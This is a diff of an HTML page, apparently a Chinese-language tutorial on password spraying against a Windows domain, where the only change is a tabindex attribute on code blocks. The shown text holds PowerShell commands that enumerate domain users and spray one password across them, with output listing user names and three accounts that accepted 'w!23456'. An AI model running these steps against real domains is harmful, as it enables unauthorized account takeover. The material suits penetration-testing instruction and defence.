@@ -117,13 +117,13 @@
 <h3 id="获取域环境中的用户列表">获取域环境中的用户列表</h3>
 <p><strong>命令：</strong><code>C:\PS&gt; Get-DomainUserList | Out-File -Encoding ascii userlist.txt</code></p>
 <p><strong>输出：</strong></p>
-<pre><code>[*] Current domain is compatible with Fine-Grained Password Policy.
+<pre tabindex="0"><code>[*] Current domain is compatible with Fine-Grained Password Policy.
 [*] Now creating a list of users to spray...
 [*] There appears to be no lockout policy.
 [*] There are 8 total users found.
 [*] Created a userlist containing 8 users gathered from the current user's domain
 </code></pre><p>获取的用户名：</p>
-<pre><code>C:\PS&gt; type .\userlist.txt
+<pre tabindex="0"><code>C:\PS&gt; type .\userlist.txt
 Administrator
 Guest
 liyingzhe
@@ -136,7 +136,7 @@ dba
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-05-02/0x02.png" alt="0x02"></p>
 <p><strong>命令：</strong> <code>C:\PS&gt; Invoke-DomainPasswordSpray -Domain 域名 -Password w!23456 -OutFile sprayed-creds.txt</code></p>
 <p><strong>输出：</strong></p>
-<pre><code>[*] Current domain is compatible with Fine-Grained Password Policy.
+<pre tabindex="0"><code>[*] Current domain is compatible with Fine-Grained Password Policy.
 [*] Now creating a list of users to spray...
 [*] There appears to be no lockout policy.
 [*] Removing disabled users from list.
@@ -151,7 +151,7 @@ dba
 6 of 6 users tested[*] Password spraying is complete
 [*] Any passwords that were successfully sprayed have been output to sprayed-creds.txt
 </code></pre><p>枚举的结果：</p>
-<pre><code>C:\PS &gt; type .\sprayed-creds.txt
+<pre tabindex="0"><code>C:\PS &gt; type .\sprayed-creds.txt
 testPass:w!23456
 webManager:w!23456
 dba:w!23456
